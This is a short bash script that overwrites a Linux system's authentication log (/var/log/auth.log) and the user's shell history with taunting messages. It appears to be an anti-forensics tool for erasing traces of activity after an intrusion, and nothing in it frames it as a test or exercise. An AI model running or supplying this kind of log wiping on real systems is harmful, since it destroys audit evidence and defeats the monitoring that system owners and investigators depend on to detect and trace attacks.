#!/bin/bash

busybox echo "Where'd the log go?" > /var/log/auth.log
busybox echo "No history? That's strange..." > /home/$USER/.bash_history
